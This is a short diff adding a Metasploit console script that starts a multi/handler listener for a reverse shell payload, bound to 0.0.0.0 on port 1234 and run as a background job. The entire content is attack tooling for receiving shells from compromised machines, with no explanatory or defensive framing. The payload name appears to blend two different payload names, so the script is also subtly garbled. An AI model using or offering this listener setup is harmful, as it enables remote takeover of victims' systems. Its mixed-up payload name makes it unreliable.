@@ -1,0 +1,6 @@
+use exploit/multi/handler 
+set payload java/jsp_shell_reverse_php
+show options
+set lhost 0.0.0.0
+set lport 1234
+run -j
